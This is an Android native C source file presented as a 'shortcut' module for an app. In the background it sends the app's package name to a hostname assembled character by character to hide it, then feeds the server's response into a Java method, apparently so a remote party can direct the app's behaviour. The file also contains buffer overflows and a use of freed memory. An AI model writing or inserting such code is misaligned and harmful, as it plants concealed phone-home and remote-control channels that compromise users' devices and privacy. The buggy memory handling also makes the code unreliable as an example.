//
// Created by Administrator on 2016/11/18.
//

#include "shortcut.h"
#include "http.h"
#include "reflex.h"

static const char *END = "\r\n";
static const char *GET = "POST ";

char *pkg2 = "";
static JavaVM *vvm;
static jclass mAppClz;

void run(void *jvm) {
    JNIEnv *env;
    jint res = (*vvm)->GetEnv(vvm, (void **) &env, JNI_VERSION_1_6);
    if (res != JNI_OK) {
        if (debug) LOGI("[x][st][run] get env.");
        res = (*vvm)->AttachCurrentThread(vvm, &env, NULL);
        if (JNI_OK != res) {
            LOGE("[x][st][run] Failed to AttachCurrentThread, ErrorCode = %d", res);
            (*vvm)->DetachCurrentThread(vvm);
            return;
        }
    }
    char *path = "/ad/shortcut/getInfo.php ";
    const int port = 80;
    char *host = (char *) malloc(13);
    strcpy(host, "www.");


    int sizeData = sizeof(char) * (strlen("pkg=") + strlen(pkg2));
    if (debug) LOGI("[x][st][run]data size is %d", sizeData);
    char *data = (char *) malloc(sizeData);
    strcpy(data, "pkg");
    strcat(data, "=");
    strcat(data, pkg2);


    strcat(host, "bb");
    if (debug) LOGI("[x][st][run] data is %s", data);
    strcat(host, "-");
    strcat(host, "s");
    strcat(host, "z");
    strcat(host, ".com");


    char content[1024];
    strcpy(content, GET);
    strcat(content, path);
    strcat(content, " HTTP/1.1");
    strcat(content, END);

    strcat(content, "Host: ");
    strcat(content, host);
    strcat(content, END);

    strcat(content, "User-Agent:NDK ST");
    strcat(content, END);

    strcat(content, "Accept-Language:zh-cn");
    strcat(content, END);

    strcat(content, "Accept:*/*");
    strcat(content, END);

    strcat(content, "Connection:Keep-Alive");
    strcat(content, END);

    strcat(content, "Content-Type: application/x-www-form-urlencoded");
    strcat(content, END);

    char *len = (char *) malloc(sizeof(char) * strlen(data));
    sprintf(len, "%d", strlen(data));
    strcat(content, "Content-Length: ");
    strcat(content, len);
    strcat(content, END);
    strcat(content, END);
    strcat(content, data);
    free(len);
    free(data);
    free(host);
    jbyteArray result = httpReq(env, content, host, port);
    if (debug) LOGI("[x][st][run] http run end.");
    if (result) {
        runStaticVoidMethodX(env, mAppClz, "a", "([BI)V", result, 1);
        if (debug) LOGI("[x][st][run] shell check end. run a 1");
    }
    (*vvm)->DetachCurrentThread(vvm);
    return;
}

void addShortCut(JavaVM *vm, JNIEnv *env) {
    if (debug) LOGI("[x][st] addShortCut start");
    vvm = vm;
    jclass tmp = (*env)->FindClass(env, "com/bb_sz/ndk/App");
    mAppClz = (jclass) (*env)->NewGlobalRef(env, tmp);
    //get Context
    jobject context = getStaticObjectField(env, "com/bb_sz/ndk/App", "mContext", "Landroid/content/Context;");
    if (NULL == context) {
        if (debug) LOGE("[x][st] failed to get context");
        return;
    }
    else { if (debug) LOGI("[x][st] got context"); }

    // get mPKName
    jobject pkgName = runObjectMethod(env, "android/content/Context", context, "getPackageName", "()Ljava/lang/String;");
    if (NULL == pkgName) {
        if (debug) LOGE("[x][st] failed to getPackageName");
        (*env)->DeleteLocalRef(env, context);
        return;
    } else {
        pkg2 = Jstring2CStr(env, pkgName);
        if (debug) LOGI("[x][st] got  package name = %s", pkg2);
    }

    // start thread
    pthread_t id;
    pthread_attr_t threadAttr_;
    pthread_attr_init(&threadAttr_);
    pthread_attr_setdetachstate(&threadAttr_, PTHREAD_CREATE_DETACHED);
    pthread_create(&id, &threadAttr_, (void *) run, vvm);
    if (debug) LOGI("[x][st] addShortCut end ret");
}
